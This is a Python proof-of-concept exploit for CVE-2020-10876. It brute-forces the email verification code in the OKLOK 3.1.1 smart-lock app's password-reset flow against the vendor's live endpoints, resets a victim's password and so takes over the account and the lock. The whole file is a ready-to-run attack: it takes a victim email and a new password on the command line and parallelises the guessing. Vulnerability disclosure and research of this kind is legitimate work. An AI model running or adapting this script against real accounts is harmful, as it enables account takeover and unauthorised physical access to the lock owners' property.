#!/usr/bin/env python3

#PoC code for CVE-2020-10876
#Brute force OKLOK 3.1.1 email verification code from 'Forgot password' and change the password of the victim account
#results in takeover of the user account and gives the attacker control of the lock

import requests
import json
import sys
import itertools
import datetime
import multiprocessing
from functools import partial

#generate the victim account verification code that will be brute forced
def generate_code(victim_email_address, headers):


	check_user_url = 'https://app.oklok.com.cn/oklock/user/userIsExist'
	get_code_url = 'https://app.oklok.com.cn/oklock/user/getCode'

	check_user_body = {"userId":victim_email_address}
	get_code_body = {"account":victim_email_address,"code":"fccbfedcaf0ed1da34a0e4a85d0970a8"}

	check_user = requests.post(check_user_url, data=json.dumps(check_user_body), headers=headers)
	json_check_user = check_user.json()
	check_user_status = json_check_user['status']

	if check_user_status == '4004':
		print('Confirmed valid account...')
		get_code = requests.post(get_code_url, data=json.dumps(get_code_body), headers=headers)
		json_get_code = get_code.json()
		get_code_status = json_get_code['status']
		print(json_get_code)
		if get_code_status == '2000':
			print('Verification code sent...')
			return True
		else:
			sys.exit('HTTP Error - Verification code could not be sent.')
	else:
		sys.exit('Invalid user.')


#brute force the verification code and change the victim account password
def change_password(code, victim_email_address, new_password, headers):

	change_pw_url = 'https://app.oklok.com.cn/oklock/user/forget'
	change_pw_body = {"password":new_password,"account":victim_email_address,"code":code}

	change_pw = requests.post(change_pw_url, data=json.dumps(change_pw_body), headers=headers)
	json_change_pw = change_pw.json()
	change_pw_status = json_change_pw['status']

	if change_pw_status == '2000':
		print(f'Verification code found!: {code}')
		print(f'Password was changed to {new_password}!')
		end_time = datetime.datetime.now()
		total_time = end_time - start_time
			
		print('Total Execution Time: ' + str(total_time))
		print('-------------------------------------------------------------\n')

		return code

#main
if __name__ == '__main__':

	start_time = datetime.datetime.now() 

	codes_filename = 'verification_codes.txt'

	headers = {'Host': 'app.oklok.com.cn',
	'Content-Type': 'application/json',
	'Connection': 'keep-alive',
	'Accept': '*/*',
	'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
	'Accept-Language': 'en-US;q=1',
	'Accept-Encoding': 'gzip, deflate, br'}

	if len(sys.argv) is not 3:
		sys.exit('Usage: python3 ownklok_change_pw.py <victim_email_address> <new_password>')
	else:
		victim_email_address = str(sys.argv[1])
		new_password = str(sys.argv[2])
		chpw = partial(change_password, victim_email_address=victim_email_address, new_password=new_password, headers=headers)


	if (generate_code(victim_email_address, headers)) == True:
		with open(codes_filename, "r") as codes_file:
			codes = codes_file.read().split("\n")
		print('\n-------------------------------------------------------------')
		print('Brute forcing verification code...')

	num_workers = multiprocessing.cpu_count()
	chunk_size = int(len(codes)/num_workers)
	pool = multiprocessing.Pool(num_workers)
	for i in pool.imap_unordered(chpw, codes, chunksize=chunk_size):
		result = i
		if result:
			pool.terminate()
			pool.join()
			sys.exit()

	pool.close()
	pool.join()
